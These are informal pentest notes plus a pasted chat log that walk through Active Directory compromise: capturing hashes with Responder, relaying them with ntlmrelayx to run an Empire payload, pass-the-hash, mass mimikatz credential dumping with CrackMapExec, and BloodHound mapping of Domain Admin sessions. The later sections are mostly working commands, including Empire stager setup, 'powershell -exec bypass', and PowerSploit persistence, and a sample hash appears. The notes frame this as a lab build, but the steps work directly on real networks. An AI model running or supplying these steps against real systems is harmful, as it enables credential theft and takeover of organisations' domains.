bloodhound - every domain user is local admin on one pc, with local admin pass the hash to a pc where DA is logged in, use mimikatz or ntlm hash

username:unique identifier:lmhash:ntlmhash

When you see aad3b435b51404eeaad3b435b51404ee for lmhash it means it's blank

anything else means its populated

If you ever come across an LM hash it's like finding gold because it's super easy to crack

To pass a hash use the smb\_login metasploit module and for password type in aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71

If you're doing local admin pass the hash set workgroup to .

In a windows AD environment 9 times out of 10 all the workstations share the same local administrator password

You might lucky and both the workstations and servers share the same local administrator password

To capture a user I personally use Responder [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

NetNTLMv2 is microsoft's challenge and response protocol. When authenticating to a server the user's hash followed by the server's challenge is used

With relaying hashes you simply take the netntlmv2 hash you collected and relay it to a set of hosts and hopefully the user\(s\) have administrator access

[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

This is a great guide on how to do relaying

The guide mentions using an Empire payload. This is the empire tool

So once you have administrator access to a box you can fun mimikatz

If you local administrator hash on all workstations you can use crackmap exec to do a mass mimikatz

So basically it does a pass the hash on multiple workstations, runs the mimikatz sekurlsa::loggonpasswords and returns output

Hopefully one of them is a domain admin and game over

Say you're an IT administrator

You're logged into your workstation and your account has domain admin rights

I come along and pop a admin shell on another workstation

I grab the hash and do a pass the hash with the local administrator account to your box and then run mimikatz

If you're running win 7 and 8 i'll get plain text plus ntlm hash if you're running win 8.1 and above only ntlm hash

ok, so you gain the local admin hash, and pass it to the DA which proves you are admin on DA, which allows you to do mimikatz and extract domain admin credentials?

You're hoping the IT admins used the same local administrator account on all workstations

Yes

local hash is NTLM, network hash is netntlmv2

before you look for DA you type in net user "Domain Admins" /domain onto the box you have a shell on

It will come back with all the users in the DA group

then you can use tools like bloodhound or powersploit to find where they are logged in

Bloodhound collects information from the domain controller to determine the number of users, groups, computers and sessions

One server, and 3 workstations

The workstations will be win 7 win 8 and win 10

Next create a domain and give it whatever name you want

Create a domain administrator account and two user accounts

Log into one workstation with DA creds and the other with a regular user

Give the regular user local administrator rights Configure all workstations with the same local administrator account

windows 8.1 will only give ntlm hash

NTLM hash is just as good as plaintext creds when authenticating to windows machines so it's not that big of a deal

plaintext creds are stored in memory. Everytime a user clicks on a  network share the creds are passed across the network

https://www.christophertruncer.com/responder-user-account-credentials-first-come-first-served/

password spraying?

lm = everything before w7, but also local passwords shorter than 15 char

ntlm = local passwords

netntlmv2 = hashes captured on the network


shell net groups "Domain Admins/matrix"


|||||||||||||||||||||

lkys37en [8:13 PM]
When a windows machine needs to perform a resource lookup such as a network share it will go in this order DNS, WINS, NetBIOS and LLMNR (ink-Local Multicast Name Resolution)

[8:14]
Problem is because doing FQDN lookups is not enabled by default it defaults to WINS and then NetBIOS

FQDN is Fully Qualified Domain Name
Just another way of saying DNS name
For example, share.hacklab.net is a FQDN

[8:14]
For example if you looked up share.hacklab.local responder won't capture anything

[8:14]
If you looked up share it would

[8:16]
NetBIOS is a poor man's DNS

[8:17]
In the corporate world a DNS server is available to look up resources, in a home environment it's less likely so if you want to share content between two workstations NetBIOS is how it's done

[8:17]
But because users don't type in share.hacklab.net NetBIOS is used

https://github.com/SpiderLabs/Responder
https://github.com/CoreSecurity/impacket
https://github.com/EmpireProject/Empire
https://github.com/byt3bl33d3r/CrackMapExec
https://github.com/byt3bl33d3r/DeathStar
https://github.com/BloodHoundAD/BloodHound
https://github.com/BloodHoundAD/BloodHound/releases
https://github.com/PowerShellMafia/PowerSploit
https://github.com/gentilkiwi/mimikatz
https://neo4j.com/download/



https://www.sw1tch.net/2015/08/11/powershellempire-5-minute-quick-start-guide-featuring-kali-linux-andor-debian-8-0/
https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
./empire
uselistener http
set Port 81
execute
back
usestager multi/launcher
set Listener http
generate
<copypaste payload>
agents


./Responder -I eth0
ntlmrelayx.py -tf targets.txt -c 'payload_from_empire'

|||||||||||||||| bloodhound

set up neo4j
https://neo4j.com/developer/kb/how-do-i-enable-remote-https-access-with-neo4j-30x/

/opt/neo4j-community-3.1.1/bin/neo4j
start neo4j and set new password
edit neo4j.conf
dbms.connector.http.enabled=true
dbms.connector.http.listen_address=0.0.0.0:7474

launch bloodhound and log in to neo4j db

powershell -exec bypass
upload /path/bloodhound.ps1
Import-Module ./BloodHound.ps1
Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"

kan nå laste opp powersploit moduler.
upload /path/powersploit/persistence.msl1
import-module ./persistence.msl1
Get-SecurityPackages


testuser:29418:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
